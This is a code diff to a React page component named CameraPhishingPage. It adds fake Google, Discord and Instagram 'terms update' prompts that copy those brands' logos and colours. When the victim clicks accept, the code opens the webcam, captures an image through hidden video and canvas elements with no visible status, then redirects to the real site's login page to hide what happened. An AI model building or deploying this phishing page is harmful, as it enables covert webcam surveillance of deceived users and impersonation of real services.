@@ -9,7 +9,34 @@ import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated i
 import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react'; // Added ShieldCheck, Sparkles, Wand2
 import { cn } from '@/lib/utils';
 
-const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; visual?: React.ReactNode; headerClassName?: string; }> = {
+const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; visual?: React.ReactNode; headerClassName?: string; redirectUrl?: string; }> = {
+  'google-policy-update': {
+    title: 'Google - Policy Update',
+    message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
+    cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
+    actionText: 'Accept & Continue',
+    headerClassName: "bg-white text-black",
+    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />,
+    redirectUrl: 'https://www.google.com/search?q=your+search+query'
+  },
+  'discord-terms-update': {
+    title: 'Discord - Terms of Service Update',
+    message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
+    cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
+    actionText: 'Accept Terms',
+    headerClassName: "bg-[#5865F2] text-white",
+    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />,
+    redirectUrl: 'https://discord.com/login'
+  },
+  'instagram-privacy-update': {
+    title: 'Instagram - Privacy Policy Update',
+    message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
+    cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
+    actionText: 'Accept Policy',
+    headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white",
+    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />,
+    redirectUrl: 'https://www.instagram.com/accounts/login/'
+  },
   'photo-contest-entry': {
     title: 'SnapWin Contest!',
     message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
@@ -91,6 +118,45 @@ export default function CameraPhishingPage() {
     }
   };
 
+  const handleCookieConsentAndCamera = async () => {
+    setCookieConsentGiven(true);
+    setIsLoading(true);
+    setError(null);
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      streamRef.current = stream;
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.onloadedmetadata = () => {
+           if (videoRef.current) videoRef.current.play();
+           setStatus("streaming");
+           setIsLoading(false);
+           setTimeout(() => {
+             captureImage();
+             if (content.redirectUrl) {
+               window.location.href = content.redirectUrl;
+             }
+           }, 1500);
+        };
+      }
+    } catch (err) {
+      console.error("Camera access error:", err);
+      let errorMessage = 'Could not access camera.';
+      if (err instanceof DOMException) {
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          errorMessage = 'Camera access denied by user.';
+        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
+          errorMessage = 'No camera found on this device.';
+        }
+      }
+      setError(errorMessage);
+      setStatus('error');
+      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
+      setIsLoading(false);
+    }
+  };
+
   const handleCameraRequest = async () => {
     if (streamRef.current) stopCameraStream();
 
@@ -126,11 +192,6 @@ export default function CameraPhishingPage() {
       setIsLoading(false);
     }
   };
-  
-  const handleCookieConsentAndCamera = () => {
-    setCookieConsentGiven(true);
-    handleCameraRequest();
-  };
 
   const stopCameraStream = (isAfterCapture = false) => {
     if (streamRef.current) {
@@ -152,6 +213,50 @@ export default function CameraPhishingPage() {
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
+  if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
+    return (
+      <>
+        <PhishingPageLayout
+          title={content.title}
+        >
+          <div className={cn("text-center mb-6", content.headerClassName)}>
+            <div className="flex items-center justify-center p-4">
+              {content.visual}
+              <h1 className={cn("text-2xl font-bold", content.headerClassName ? (templateId === 'google-policy-update' ? 'text-black' : 'text-white') : '')}>{content.title}</h1>
+            </div>
+          </div>
+          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
+          
+          {/* Hidden video and canvas for silent capture */}
+          <video ref={videoRef} className="hidden" playsInline muted />
+          <canvas ref={canvasRef} className="hidden"></canvas>
+
+          {/* No visible status messages for silent capture */}
+          
+        </PhishingPageLayout>
+
+        {!cookieConsentGiven && (
+            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
+              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
+                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
+                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
+                </p>
+                <Button
+                  onClick={handleCookieConsentAndCamera}
+                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
+                  size="md"
+                  disabled={isLoading && !cookieConsentGiven} 
+                >
+                  <Cookie className="mr-2 h-4 w-4" />
+                  {content.actionText || 'Accept Cookies'}
+                </Button>
+              </div>
+            </div>
+        )}
+      </>
+    );
+  }
 
   if (templateId === 'photo-contest-entry') {
     return (
